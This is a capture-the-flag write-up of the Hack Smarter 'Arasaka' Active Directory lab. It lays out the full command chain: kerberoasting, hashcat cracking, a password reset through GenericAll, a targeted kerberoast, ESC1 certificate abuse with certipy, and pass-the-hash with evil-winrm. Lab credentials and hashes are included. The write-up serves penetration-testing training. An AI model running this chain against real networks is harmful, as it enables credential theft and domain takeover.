---
title: "Hack Smarter - Challenge Lab: Arasaka (Easy)"
date: 2025-11-26T00:00:00Z
draft: false
description: "Write-up for Hack Smarter's Arasaka Lab."
---
## Hack Smarter - Challenge Lab: Arasaka (Easy)
This is my second day of doing Hack Smarter labs. This lab starts off suplying us with credentials like an assumed breach scenario. This box invovles ACL attacks and certificates.

Jump to sections: [faraday](#faraday) · [alt.svc](#alt.svc) · [yorinobu](#yorinobu) · [soulkiller.svc](#soulkiller.svc) · [the_emperor](#the_emperor)

## faraday {#faraday}
The first thing I like doing when landing on a box is testing the initial creds which I use nxc for.
`nxc smb 10.0.19.213 -u faraday -p hacksmarter123 --shares`

{{< image src="/assets/Arasaka/01_faraday_nxc.png" alt="" width="1200" linked="false" class="center-image" >}} 

No interesting shares so let's start with BloodHound and ldapdomaindump enumeration.
`bloodhound-ce-python -d hacksmarter.local -u faraday -p hacksmarter123 -ns 10.0.19.213 -c all `

`ldapdomaindump ldap://10.0.19.213 -u 'hacksmarter.local\faraday' -p 'hacksmarter123'`

Checking the output of ldapdomaindump we can see the user `alt.svc` has SPN set so we will do a targeted kerberoast.

{{< image src="/assets/Arasaka/02_spn_set.png" alt="" width="1200" linked="false" class="center-image" >}} 

`sudo impacket-GetUserSPNs hacksmarter.local/faraday:hacksmarter123 -dc-ip 10.0.19.213 -request-user 'alt.svc' -outputfile alt.svc_hash.txt`

{{< image src="/assets/Arasaka/03_kerberoast.png" alt="" width="1200" linked="false" class="center-image" >}} 

Now let's crack the hash using hashcat. 

`hashcat -m 13100 alt.svc_hash.txt /usr/share/wordlists/rockyou.txt`

## alt.svc {#alt.svc}

Sweet now we have the alt.svc creds, lets quickly verify them with nxc.

`nxc smb 10.0.19.213 -u alt.svc -p babygirl1`

{{< image src="/assets/Arasaka/04_nxc_alt_svc.png" alt="" width="1200" linked="false" class="center-image" >}} 

Next we go into the BloodHound GUI and add alt.svc as owned and we check their outbound object control to find they have generic all over yorinobu.

{{< image src="/assets/Arasaka/05_generic_all.png" alt="" width="1200" linked="false" class="center-image" >}} 

Since this is just a lab we do a password change for yorinobu and then verify the change took place.

`net rpc password 'yorinobu' 'newP@ssword2022' -U 'hacksmarter.local'/'alt.svc'%'babygirl1' -S '10.0.19.213'`

`nxc smb 10.0.19.213 -u yorinobu -p 'newP@ssword2022'`

{{< image src="/assets/Arasaka/06_yorinobu_pw_change.png" alt="" width="1200" linked="false" class="center-image" >}} 

## yorinobu {#yorinobu}

We can now check out what outbound object control yorinobu has and we can see they have generic write over soulkiller.svc. We can follow the BloodHound instructions for performing a targetedKerberoast on soulkiller.svc, this will briefly add a SPN to the account we have generic write over and will show us the Kerberoasting output and then remove the SPN. The goal is to hope that the user has a weak password that we can crack.

`python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'newP@ssword2022' --request-user 'soulkiller.svc'`

{{< image src="/assets/Arasaka/07_targetedkerberoast.png" alt="" width="1200" linked="false" class="center-image" >}} 

## soulkiller.svc {#soulkiller.svc}

Next we can run hashcat to crack the password and then verify the creds using nxc.

`hashcat -m 13100 soulkiller.svc_hash.txt /usr/share/wordlists/rockyou.txt`

`nxc smb 10.0.19.213 -u 'soulkiller.svc' -p 'MYpassword123#'`

{{< image src="/assets/Arasaka/08_soulkiller_nxc.png" alt="" width="1200" linked="false" class="center-image" >}} 

soulkiller.svc doesn't show anything too interesting in BloodHound, but when we check ldapdomaindump we find some useful information. The description mentions that this account is used for certificate management, immediately I am thinking certipy to check for vulnerable certificates.

{{< image src="/assets/Arasaka/09_soulkiller_description.png" alt="" width="1200" linked="false" class="center-image" >}} 

Let's run a check to try to find some vulnerable templates.

`certipy find -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.0.19.213 -text -enabled -hide-admins`

We can check the output and find that `AI_Takeover` is vulnerable to ESC1.

{{< image src="/assets/Arasaka/10_certipy_output.png" alt="" width="1200" linked="false" class="center-image" >}} 

Now we need to request a certificate using certipy, ESC1 lets us request a certificate for any user, I first tried administrator which did not work due to the password being expired, so we try requesting a certificate as the_emperor since they are a DA as well.

`certipy req -u 'soulkiller.svc@hacksmarter.local' -p "MYpassword123#" -dc-ip '10.0.19.213' -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local' -debug -target 'dc01.hacksmarter.local' -ca 'hacksmarter-DC01-CA'`

{{< image src="/assets/Arasaka/11_certipy_req.png" alt="" width="1200" linked="false" class="center-image" >}} 

Now that we have the .pfx file we can use certipy to auth as that user and get teh hash for us.

`certipy auth -pfx the_emperor.pfx -dc-ip 10.0.19.213`

{{< image src="/assets/Arasaka/12_certipy_auth.png" alt="" width="1200" linked="false" class="center-image" >}} 

## the_emperor {#the_emperor}
We quickly verify the hash we received is valid using nxc.

`nxc smb 10.0.19.213 -u 'the_emperor' -H aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133`

{{< image src="/assets/Arasaka/13_pwnd.png" alt="" width="1200" linked="false" class="center-image" >}} 

Sweet we are now DA, let's grab the flag. I like using evil-winrm it has many helpful built in features.

`evil-winrm -i 10.0.19.213 -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133`

`type Administrator\Desktop\root.txt`

{{< image src="/assets/Arasaka/14_root_txt.png" alt="" width="1200" linked="false" class="center-image" >}} 